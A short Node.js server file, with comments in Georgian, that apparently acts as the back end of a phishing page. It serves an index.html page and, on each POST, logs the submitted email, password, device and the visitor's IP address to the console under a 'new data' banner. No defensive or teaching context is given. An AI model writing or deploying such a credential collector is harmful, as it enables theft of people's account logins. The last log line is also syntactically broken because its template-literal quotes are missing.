const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                console.log('\n🔥 ახალი მონაცემები!');
                console.log('📧 EMAIL:', data.email);
                console.log('🔑 PASS:', data.pass);
                console.log('📱 DEVICE:', data.device);
                console.log('🌐 IP:', ip);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'success' }));
            } catch (e) {
                res.writeHead(400);
                res.end();
            }
        });
    } else {
        fs.readFile('index.html', (err, data) => {
            if (err) {
                res.writeHead(404);
                res.end("File not found");
            } else {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(data);
            }
        });
    }
});

// Render-ისთვის აუცილებელია პორტის დინამიური განსაზღვრა
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(Server is running on port ${PORT});
});
